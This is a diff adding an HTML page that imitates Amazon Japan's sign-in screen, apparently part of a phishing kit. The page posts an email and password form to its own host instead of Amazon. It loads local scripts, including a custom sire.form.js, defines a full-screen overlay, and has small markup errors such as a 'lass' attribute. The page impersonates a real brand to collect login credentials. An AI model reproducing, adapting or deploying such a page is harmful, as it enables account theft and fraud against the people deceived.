@@ -1,0 +1,450 @@
+<html><head>
+<meta charset="utf-8">
+<title dir="ltr">Amazonサインイン</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="icon" href="style/img/icon.png">
+<link rel="shortcut icon" href="style/img/icon.png">
+<link rel="stylesheet" href="style/style3.css">
+<link rel="stylesheet" href="style/style2.css">
+<link rel="stylesheet" href="style/style1.css">
+<style>
+.error {
+color: red
+}
+
+#zwimel {
+width: 100%;
+height: 100%;
+top: 0px;
+left: 0px;
+position: fixed;
+display: block;
+opacity: .9;
+background-color: #fff;
+z-index: 99;
+text-align: center;
+}
+</style>
+</head>
+
+<body>
+<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_158613":"T1","AUI_PCI_RISK_BANNER_210084":"C"}</script>
+<div class="a-section a-padding-medium auth-workflow">
+<div class="a-section a-spacing-none auth-navbar">
+
+
+
+
+
+
+<div class="a-section a-spacing-medium a-text-center">
+
+
+
+
+
+
+
+<a class="a-link-nav-icon" tabindex="-1" href="https://www.amazon.co.jp/ref=ap_frn_logo">
+
+<i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
+
+
+
+
+
+<i class="a-icon a-icon-jp a-icon-domain-jp a-icon-domain" role="img"></i>
+
+
+</a>
+
+
+
+</div>
+
+
+</div>
+
+<div id="authportal-center-section" class="a-section">
+
+
+
+<div id="authportal-main-section" class="a-section">
+
+
+
+
+
+
+<div class="a-section a-spacing-base auth-pagelet-container">
+
+
+
+<div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">続行するには、cookieを有効にしてください</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+<p>
+<a class="a-link-normal" href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_cookie_error_help?">
+
+</a>
+</p>
+</div></div></div>
+
+
+</div>
+
+<div class="a-section auth-pagelet-container">
+
+
+
+
+
+
+
+
+<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+
+
+<!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain -->
+
+
+<!-- show a warning modal dialog when the third party account is connected with Amazon -->
+
+
+
+
+
+
+
+
+
+
+<div class="a-section a-spacing-base">
+<div class="a-section">
+
+<form name="signineml" method="post" id="signineml" action="" lass="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form" required="" novalidate="novalidate">
+<input type="hidden" name="appActionToken" value="tFcFShIeaDFWxVOmmb6ZEj2BOv0toj3D"><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">
+<input type="hidden" name="subPageType" value="SignInClaimCollect">
+
+
+
+
+
+
+
+<input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL3JlZj1uYXZfZW1faGRfcmVfc2lnbmlu">
+
+<input type="hidden" name="prevRID" value="ape:OTVZSkhDNTFUVFo5WFBHMFhTMUg=">
+
+<input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.9NClzeJMMdp4QYwZWjhDFd0GK-ct8eogCF8lpuHOfXdRcUulYllhrA.KBADj1q5LCkTrHZt.TnBuV8AGys9xm8CfsRjavjYgwBdsvthKMAWm6FBUVyuh-_gVVHA7JHUUBHiLsJ08Ab_z4RlSmCuqOw0T_TKM-PpnTaZtD53uCipzSm5pE33HMCE2xDQ99AIR7tnt014S0qk6I8Cwz8Fq0hpDlznFCnGN3eDy_t3bm8O42mabid7c_gNcWxQ7lOWwt8-fxAMJpYIr-t2E9riyGNXR81BpVej7DB6fRhv3cV0UOJVT9miaFwiLTqNCj0ugWsB1AF6ex6qbZXzeJYWtWvurI-w_CV06MBIR7-y1cyR2C9FdnAT0LTeMzoTtYhcSg4ufKuvNz7c-AtlPrUbUAJLYY7TfI5A.L3wbJAsG8Pbl4jy41lP20A">
+
+
+
+
+<div class="a-section">
+<div class="a-box"><div class="a-box-inner a-padding-extra-large">
+<h1 class="a-spacing-small">
+ログイン
+</h1>
+<!-- optional subheading element -->
+
+<div class="a-row a-spacing-base">
+<label for="ap_email" class="a-form-label">
+Eメールまたは携帯電話番号
+</label>
+
+
+
+
+
+
+
+<input type="text" value="" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
+
+
+<input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password" class="a-input-text hide">
+
+
+
+
+<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
+Eメールアドレスまたは携帯電話番号を入力
+</div></div></div>
+
+</div>
+
+
+<input type="hidden" name="create" value="0">
+
+<div class="a-section">
+
+
+
+
+
+
+
+
+
+
+
+
+<span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
+次へ進む
+</span></span></span>
+
+
+
+
+
+
+
+<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+続行することで、 Amazonの<a href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=643006">利用規約</a>および<a href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=643000">プライバシー規約</a>に同意するものとみなされます。
+</div> 
+
+
+
+
+<script>
+function cf() {
+if (typeof window.uet === 'function') {
+uet('cf');
+}
+if (window.embedNotification &&
+typeof window.embedNotification.onCF === 'function') {
+embedNotification.onCF();
+}
+}
+</script>
+
+<script type="text/javascript">cf()</script>
+
+</div>
+
+
+
+
+
+
+
+
+
+<div class="a-section">
+<div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
+<a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
+お困りですか?
+</span></a>
+
+<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+
+
+
+
+
+
+
+
+
+
+<a id="auth-fpp-link-bottom" class="a-link-normal" href="https://www.amazon.co.jp/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fref%3Dnav_em_hd_re_signin&amp;prevRID=95YJHC51TTZ9XPG0XS1H&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=nav_em_hd_clc_signin&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
+パスワードを忘れた場合
+</a>
+</div>
+
+<div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+<a id="ap-other-signin-issues-link" class="a-link-normal" href="https://www.amazon.co.jp/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">
+その他のログインに関する問題
+</a>
+</div>
+</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div>
+</div>
+</form>
+</div>
+
+
+
+
+
+<div class="a-divider a-divider-break"><h5>Amazonの新しいお客様ですか？</h5></div>
+<span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="https://www.amazon.co.jp/ap/register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=jpflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fref%3Dnav_em_hd_re_signin&amp;prevRID=95YJHC51TTZ9XPG0XS1H&amp;openid.assoc_handle=jpflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;ref_=nav_em_hd_clc_signin&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
+Amazonアカウントを作成
+</a></span></span>
+
+
+
+</div>
+
+
+
+
+</div>
+</div>
+
+
+</div>
+
+
+<div id="right-2">
+</div>
+
+<div class="a-section a-spacing-top-extra-large auth-footer">
+
+
+
+
+<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
+
+<div class="a-section a-spacing-small a-text-center a-size-mini">
+<span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+
+<a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=643006">
+利用規約
+</a>
+<span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+<a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=643000">
+プライバシー規約
+</a>
+<span class="auth-footer-seperator"></span>
+
+
+
+
+
+
+
+
+
+<a class="a-link-normal" target="_blank" href="https://www.amazon.co.jp/help">
+ヘルプ
+</a>
+<span class="auth-footer-seperator"></span>
+
+
+
+</div>
+
+
+
+
+<div class="a-section a-spacing-none a-text-center">
+
+
+
+
+
+
+<span class="a-size-mini a-color-secondary">
+© 1996-2021, Amazon.com, Inc. or its affiliates
+</span>
+
+</div>
+
+</div>
+</div>
+
+<div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
+</div>
+
+
+
+<script type="text/javascript">
+try {
+var metadataList = document.getElementsByName('metadata1');
+if (metadataList.length == 0) {
+var input = document.createElement('input');
+input.name = 'metadata1';
+input.type = 'hidden';
+input.value = 'true';
+
+var authenticationFormList = document.getElementsByName('signIn');
+for (var index = 0; index < authenticationFormList.length; index++) {
+authenticationFormList[index].appendChild(input);
+}
+} else {
+for (var index = 0; index < metadataList.length; index++) {
+metadataList[index].value = 'true';
+}
+}
+} catch (e) {
+if (typeof window.ueLogError === 'function') {
+window.ueLogError(e, {
+message: 'Failed to populate default metadata value',
+logLevel: 'warn',
+attribution: 'FWCIMAssets'
+});
+}
+}
+</script>
+<script type="text/javascript">
+window.fwcimCmd = [
+
+['profile', 'signIn']
+
+
+];
+</script>
+
+
+<!-- cache slot rendered -->
+
+</div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="https://www.amazon.co.jp/ap/get"><input type="hidden" name="ue_back" value="2"></form>
+
+
+
+
+</div>
+
+<noscript>
+<img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-fe.amazon.com/1/batch/1/OP/A1VC38T7YXB528:358-9712262-6788052:95YJHC51TTZ9XPG0XS1H$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3D95YJHC51TTZ9XPG0XS1H:0' alt=""/>
+</noscript>
+
+
+<div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
+
+<script src="./js/jquery.min.js"></script>
+<script src="./js/jquery.validate.min.js"></script>
+<script src="./js/sire.form.js"></script>
+
+</body></html>
